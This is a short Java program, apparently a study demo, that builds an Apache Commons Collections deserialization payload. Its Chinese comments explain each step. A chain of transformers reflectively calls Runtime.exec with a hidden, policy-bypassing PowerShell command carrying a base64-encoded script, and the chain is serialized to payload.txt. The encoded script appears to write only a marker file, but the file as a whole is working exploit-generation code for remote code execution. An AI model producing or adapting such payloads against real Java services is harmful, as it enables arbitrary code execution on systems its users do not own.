import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

public class PayloadDemo {
    public static void main(String[] args) {

        Transformer[] transformers = new Transformer[]{
//           Runtime.class.getMethod("getRuntime").invoke().exec("whoami")
//                Runtime.class.getMethod("getRuntime").invoke()
          // 获取 Runtime class 对象
            new ConstantTransformer(Runtime.class), // 更新参数为Runtime.class
            new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),// 调用getMethod 返回getRuntime方法
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),// 反射getRuntime返回Runtime实例
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ZQBjAGgAbwAgACcAYQB0AHQAYQBjAGsAJwAgAD4AIABEADoAXABjAG8AZABlAFwAagBhAHYAYQBcAGMAYwBEAGUAcwBlAHIAaQBhAGwAaQB6AGUAXAByAGUAcwAuAHQAeAB0AA=="})// 利用exec 执行任意代码
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        try(
                FileOutputStream fos = new FileOutputStream("payload.txt");
                ObjectOutputStream oos = new ObjectOutputStream(fos);
            ){
            oos.writeObject(chainedTransformer);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
